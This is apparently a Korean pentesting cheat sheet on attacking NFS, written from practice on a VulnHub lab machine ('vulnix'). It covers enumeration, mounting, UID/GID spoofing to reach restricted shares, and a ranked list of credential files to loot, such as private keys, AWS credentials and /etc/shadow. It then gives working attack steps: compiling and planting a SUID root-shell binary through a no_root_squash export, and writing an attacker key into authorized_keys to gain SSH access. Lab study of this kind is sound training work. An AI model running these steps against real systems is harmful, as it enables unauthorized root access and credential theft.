# NFS

# NFS (2049)

Network File System. 잘못된 설정(no_root_squash)으로 SUID 바이너리를 원격에서 심어 권한상승하는 것이 주요 공격 벡터.

---

## 1. 열거

```bash
# nmap
nmap -p 111,2049 --script=nfs-showmount,nfs-ls,nfs-statfs <IP>
nmap -sV -p 2049 <IP>

____________________________________________________________________________/

# showmount (NFS로 공유 중인 폴더 목록 보기 - 가장 직접적)
showmount -e <IP>
# Export list for <IP>:
# /share *             ← 모든 호스트에서 접근 가능
# /home 10.10.10.0/24  ← 특정 서브넷만

showmount 결과 예시 1:
Export list for <IP>:
/home/users *

해석:
- /home/users 가 NFS로 공유 중
- * 는 모든 호스트에서 접근 가능하다는 뜻
- 마운트 시도 가능

showmount 결과 예시 2:
Export list for <IP>:

해석:
- NFS는 켜져 있지만 공유 폴더가 안 보임
- 접근 제한이 있거나 export가 없을 수 있음

showmount 에러 예시:
clnt_create: RPC: Program not registered

해석:
- NFS/mountd가 제대로 안 떠 있거나 등록 안 됨

showmount 에러 예시:
Connection refused

해석:
- 서비스가 꺼져 있거나 방화벽/필터링 가능성

____________________________________________________________________________/

# rpcinfo (NFS/RPC 관련 서비스가 켜져 있는지, 그리고 몇 번 포트에서 도는지 확인하는 명령어)
rpcinfo <IP>
# 옵션 없이 실행 : tcp+udp+tcp6+udp6 다 조회해서 프로토콜별로 중복 출력됨, owner(등록 프로세스 권한) 컴럼도 추가로 나옵, local /run/rpcbind.sock 같은 로컬 소켓 등록도 섞여 나옴(원격 접근 가능하다는 뜻은 아님)
rpcinfo -p <IP>
# -p 옵션 : TCP 111번으로만 조회, 출력이 program/vers/proto/port/service 5개컴럼으로 간결함, owner·local 항목은 안 나옴, 방화벽이 UDP를 막고 TCP만 열어둔 환경에서 이 옵션이 더안정적으로 동작하는 경우가 많음

출력에서 볼 것:
1. service 컬럼에 nfs가 있나?
2. service 컬럼에 mountd가 있나?

예시:
program vers proto port  service
100000  4    tcp   111   portmapper
100003  3    tcp   2049  nfs
100005  3    tcp   36028 mountd
100021  4    tcp   55088 nlockmgr
100024  1    tcp   39446 status

해석:
- portmapper/rpcbind 있음 = RPC 안내 서비스가 켜져 있음
- nfs 있음 = NFS 파일 공유 서비스가 켜져 있음
- mountd 있음 = NFS 공유 폴더 목록 확인/마운트 처리가 가능할 수 있음
- nlockmgr/status/nfs_acl = NFS 보조 서비스, 초반엔 중요도 낮음

켜져 있는지 판단:
- rpcinfo 결과에 "nfs" 줄이 있으면 NFS 켜져 있음
- rpcinfo 결과에 "mountd" 줄이 있으면 NFS 마운트 관련 서비스 켜져 있음
- rpcinfo 결과에 "nfs"가 없으면 NFS는 꺼져 있거나 외부에서 안 보이는 상태

빠른 확인:
rpcinfo -p <IP> | grep -E "nfs|mountd"

결과가 나오면:
100003  3  tcp  2049   nfs
100005  3  tcp  36028  mountd

의미:
- NFS가 보인다
- 다음 단계로 showmount를 한다

결과가 아무것도 안 나오면:
- NFS 쪽은 우선순위 낮춤
- 다른 포트/서비스를 본다
```

---

## 2. 마운트

```bash
# 마운트
1.mkdir /tmp/nfs_mount # 마운트 할 파일 생성 
2-1.mount -t nfs <IP>:/share /tmp/nfs_mount
# -t nfs = 마운트할 파일시스템 타입을 NFS로 지정
2-2.mount -t nfs -o rw,vers=3 <IP>:/share /tmp/nfs_mount    # NFSv3 강제
2-3.mount -t nfs -o rw,vers=4 <IP>:/share /tmp/nfs_mount    # NFSv4
3.cd /tmp/nfs_mount

____________________________________________________________________________/

mount 에러 예시:
┌──(jaejun835㉿jaejun835)-[~/vulnhub/vulnix]
└─$ mount -t nfs 192.168.122.81:/home/vulnix /tmp/nfs_mount
mount.nfs: failed to apply fstab options

해결 방법:
sudo 옵션 켜기
____________________________________________________________________________/

mount 폴더 접근 시도 에러 예시:
┌──(root㉿jaejun835)-[~]
└─# cd /tmp/nfs_mount                   
cd: permission denied: /tmp/nfs_mount

원인:
- 마운트는 됐지만 권한 때문에 디렉터리에 못 들어감
- NFS에서는 root가 항상 만능이 아님
- root_squash 때문에 클라이언트의 root가 서버에서 nobody 같은 낮은 권한으로 취급될 수 있음

해결방법:
1. 마운트 폴더의 UID/GID 확인
ls -ldn /tmp/nfs_mount

예시 결과:
drwxr-x--- 2 2008 2008 4096 Sep 3 2012 /tmp/nfs_mount

해석:
- 소유자 UID = 2008
- 그룹 GID = 2008
- 권한이 750이라 UID/GID 2008 사용자만 접근 가능

2. 로컬 Kali에 같은 UID/GID 사용자 생성
groupadd -g <GID 숫자> <그룹명> 2>/dev/null || true
useradd -u <UID 숫자> -g <GID 숫자> -m <유저명> 2>/dev/null || true

3. 해당 사용자 권한으로 접근 확인
sudo -u <유저명> ls -la /tmp/nfs_mount

4. 쉘로 들어가서 직접 작업
sudo -u <유저명> bash
cd /tmp/nfs_mount
ls -la
____________________________________________________________________________/

# 마운트 확인
df -h | grep nfs
mount | grep nfs

____________________________________________________________________________/

# 마운트 해제
umount /tmp/nfs_mount
```

---

## 3. mount 후 파일 탐색 + 중요한 파일들

```jsx
# 현재 마운트된 디렉터리 전체를 숫자 UID/GID 포함해서 보기
ls -la /tmp/nfs_mount
ls -lan /tmp/nfs_mount

# 하위 디렉터리/파일 재귀적으로 찾기
find /tmp/nfs_mount -maxdepth 3 -ls

# 숨김 파일 포함해서 파일만 보기
find /tmp/nfs_mount -maxdepth 3 -type f -ls

# 디렉터리만 보기
find /tmp/nfs_mount -maxdepth 3 -type d -ls

# 쓰기 가능한지 테스트
sudo -u vulnixuser touch /tmp/nfs_mount/write-test
sudo -u vulnixuser ls -la /tmp/nfs_mount
sudo -u vulnixuser rm /tmp/nfs_mount/write-test

# 중요한 SSH 관련 폴더 있는지 확인
ls -la /tmp/nfs_mount/.ssh 2>/dev/null || echo ".ssh 없음"

# 권한/소유자 자세히 보기
stat /tmp/nfs_mount
stat /tmp/nfs_mount/.bashrc

____________________________________________________________________________/

# NFS 마운트 후 주요 파일 탐색

# ── SSH 관련 (~/.ssh/)
authorized_keys      [긴급]  공개키 추가 시 SSH 키 인증 로그인 가능
id_rsa               [긴급]  개인키. 복사해서 SSH 직접 로그인 가능
known_hosts          [보통]  접속 이력. 내부망 IP 파악 가능
config               [보통]  다른 호스트 접속 정보 있을 수 있음
id_rsa.pub           [낮음]  공개키. 유저 확인 정도

# ── 쉘 설정 파일
.bash_history        [긴급]  명령어 기록. 비밀번호/경로 노출 가능
.zsh_history         [높음]  zsh 명령어 기록
.bashrc              [보통]  PATH, alias, 환경변수 힌트
.bash_profile        [보통]  로그인 쉘 환경 설정
.viminfo             [보통]  vim으로 열었던 파일 경로/내용 잔존
.lesshst             [낮음]  less로 열었던 파일 기록

# ── 인증/자격증명
.netrc               [긴급]  FTP/HTTP 자격증명 평문 저장
.env                 [긴급]  비밀번호/토큰 평문 저장 빈번
*.pem / *.key        [긴급]  개인키. 위치 무관 즉시 수거
.aws/credentials     [긴급]  AWS 액세스키/시크릿키
.my.cnf              [높음]  MySQL 자격증명. [client] 섹션 확인
.pgpass              [높음]  PostgreSQL 비밀번호
.docker/config.json  [보통]  Docker 레지스트리 인증 토큰

# ── 시스템 파일 (공유된 경우)
/etc/shadow          [긴급]  비밀번호 해시. john/hashcat 크래킹 가능
/etc/exports         [긴급]  NFS 설정. no_root_squash 여부 확인
/etc/passwd          [높음]  유저 목록, UID/GID, 홈 디렉터리, 기본 쉘
/etc/crontab         [높음]  자동 실행 작업. 쓰기 가능하면 악용 가능

# ── 앱/서비스 설정
config.php/yml       [높음]  DB 자격증명, API 키
*.bak / *.old        [높음]  백업 파일. 보안 설정 느슨할 수 있음
*.log                [보통]  에러 로그에 경로/자격증명 노출 가능
```

---

## 4. /etc/exports 확인 (피해자에서)

```bash
cat /etc/exports
# /share *(rw,no_root_squash)        ← 취약: 모든 호스트, root squash 없음
# /home *(rw,root_squash)            ← 안전: root squash 적용
# /backup 10.10.10.0/24(rw,sync)     ← 특정 서브넷만
```

**핵심 옵션 설명:**
| 옵션 | 의미 |
|——|——|
| `no_root_squash` | 클라이언트 root = 서버 root → **취약** |
| `root_squash` | 클라이언트 root → 익명 사용자로 매핑 (기본값) |
| `rw` | 읽기/쓰기 허용 |
| `ro` | 읽기 전용 |
| `sync` | 동기 쓰기 |
| `insecure` | 1024 이상 포트 허용 |

---

## 5. no_root_squash 권한상승

`no_root_squash` 설정 시 공격자(root)가 NFS 공유에 SUID 바이너리 심기 가능.

```bash
# 공격자 머신에서 (root로 실행)

# 1단계: 마운트
mkdir /tmp/nfs_mount
mount -t nfs -o rw,vers=3 <타겟IP>:/share /tmp/nfs_mount

# 2단계: SUID 바이너리 컴파일 및 배치
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/shell.c -o /tmp/nfs_mount/shell
chmod +s /tmp/nfs_mount/shell
ls -la /tmp/nfs_mount/shell    # -rwsr-xr-x 확인

# 3단계: 피해자에서 실행
# (피해자 저권한 쉘에서)
ls -la /share/shell             # SUID 확인
/share/shell                    # → root shell 획득!
```

---

## 6. authorized_keys 심기 (홈 디렉터리 공유 시)

```bash
1 ── 키 쌍 생성 ──────────────────────────────────────────────
ssh-keygen -t rsa -b 4096 -f /tmp/nfs_key -N ""
# /tmp/nfs_key      → 개인키
# /tmp/nfs_key.pub  → 공개키

mkdir -p /tmp/nfs_mount/.ssh
chmod 700 /tmp/nfs_mount/.ssh

2 ── 공개키 심기 ─────────────────────────────────────────────
cat /tmp/nfs_key.pub >> /tmp/nfs_mount/.ssh/authorized_keys
chmod 600 /tmp/nfs_mount/.ssh/authorized_keys

3 ── SSH 접속 (상황별) ────────────────────────────────────────
# NFS로 /home/<계정> 마운트된 경우
ssh -i /tmp/nfs_key <계정>@<타겟IP>

# NFS로 /root 마운트된 경우
ssh -i /tmp/nfs_key root@<타겟IP>

# 기본 포트(22)가 아닌 경우
ssh -i /tmp/nfs_key -p <포트> <계정>@<타겟IP>

# 키 인증 안되고 비밀번호 아는 경우
ssh <계정>@<타겟IP>

____________________________________________________________________________/

# 공개 키로 ssh 로그인이 되지 않을 경우

1. 기존 마운트 해제
umount /tmp/nfs_mount 2>/dev/null

2. NFSv3로 다시 마운트
mount -t nfs -o rw,vers=3,nolock 192.168.122.81:/home/vulnix /tmp/nfs_mount

3. 숫자 UID/GID로 다시 확인
ls -ldn /tmp/nfs_mount

4. UID/GID 유저가 없으면 생성
groupadd -g <GID 숫자> <그룹명> 2>/dev/null || true
useradd -u <UID 숫자> -g <GID 숫자> -m <유저명> 2>/dev/null || true

5. 기존 .ssh 제거 후 다시 생성
sudo -u <유저명> rm -rf /tmp/nfs_mount/.ssh
sudo -u <유저명> mkdir -p /tmp/nfs_mount/.ssh
sudo -u <유저명> chmod 700 /tmp/nfs_mount/.ssh

6. 키가 이미 있으니까 다시 넣기
sudo -u vulnixuser bash -c 'cat /tmp/nfs_key.pub > /tmp/nfs_mount/.ssh/authorized_keys'
sudo -u vulnixuser chmod 600 /tmp/nfs_mount/.ssh/authorized_keys

7. 반드시 숫자로 소유자 확인
ls -lan /tmp/nfs_mount
ls -lan /tmp/nfs_mount/.ssh

정상 결과:
drwx------ 2 2008 2008 ... .ssh
-rw------- 1 2008 2008 ... authorized_keys

8.SSH 접속
ssh -i /tmp/nfs_key <유저명>@<IP>

____________________________________________________________________________/

# 만약 또 인증키로 로그인이 되지 않고 또 물어본다면

1. 디버그 모드로 확인
ssh -vvv -i /tmp/nfs_key vulnix@192.168.122.81

핵심줄:
Offering public key: /tmp/nfs_key RSA ...
send_pubkey_test: no mutual signature algorithm

2.최신 Kali/OpenSSH와 오래된 타겟 OpenSSH 간 호환성 이슈로 인해 생긴 문제이니, 개인키 파일 권한을 600으로 고정하고, 구버전 서버가 사용하는 ssh-rsa 알고리즘을 명시적으로 허용하여 SSH 접속을 시도함
chmod 600 /tmp/nfs_key

ssh -i /tmp/nfs_key \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o HostkeyAlgorithms=+ssh-rsa \
  vulnix@192.168.122.81
```

### 공격 원리:

```jsx
SSH 키 인증 + NFS 공격 원리
─────────────────────────────────────────────
SSH 키 인증 구조

1. SSH는 비밀번호 외에 키 쌍으로도 인증 가능
   - 개인키 (id_rsa)     → 클라이언트가 보관
   - 공개키 (id_rsa.pub) → 서버에 등록

2. 공개키 vs 개인키
   공개키  = 자물쇠 (서버에 달아놓음, 누구한테나 줘도 됨)
   개인키  = 열쇠   (내가 보관, 절대 유출 안됨)
   둘은 한 쌍이지만 하나로 다른 하나를 만들어낼 수 없음

3. 로그인 흐름 (핸드셰이크)
   클라이언트 → 서버  : "나 접속할게"
   서버 → 클라이언트  : 랜덤 데이터를 공개키로 암호화해서 전송
   클라이언트         : 개인키로 복호화 → 다시 서버로 전송
   서버               : 내가 보낸 데이터와 일치하면 로그인 허용

   → 개인키 자체는 절대 네트워크로 안 나감
   → 암호화/복호화 과정으로만 "내가 개인키 가지고 있다" 증명

─────────────────────────────────────────────
NFS 구조

타겟 서버                      공격자 (Kali)
/home/vulnix  ──NFS 공유──→  /tmp/nfs_mount
(실제 파일)                   (마운트 포인트)

NFS는 네트워크를 통해 서버의 디렉터리를
원격에서 로컬처럼 사용할 수 있게 해주는 프로토콜

즉 /tmp/nfs_mount 에 파일을 쓰면
실제로는 타겟 서버의 /home/vulnix 에 써지는 것

─────────────────────────────────────────────
공격 흐름

NFS로 vulnix 홈 디렉터리가 마운트되어 있음
         ↓
authorized_keys 는 그냥 텍스트 파일
쓰기 권한만 있으면 내 공개키를 추가 가능
         ↓
/tmp/nfs_mount/.ssh/authorized_keys 에 공개키 추가
= 타겟 서버의 /home/vulnix/.ssh/authorized_keys 에 추가
         ↓
SSH 접속 시 서버가 공개키로 챌린지 암호화해서 전송
         ↓
클라이언트가 개인키로 복호화 후 응답
         ↓
서버가 검증 → 비밀번호 몰라도 로그인 허용

NFS 쓰기 권한 = 서버 자물쇠에 내 자물쇠 추가 권한
```

---

## 팁

- `vers=3` 안 되면 `vers=2` 또는 `vers=4` 시도
- 마운트 전 `showmount -e` 로 공유 경로와 허용 호스트 확인
- root_squash (기본값) 환경에서는 권한상승 불가 → 다른 방법 찾기
- `/etc/exports` 에 `insecure` 옵션 있으면 1024 이상 포트로 접근 가능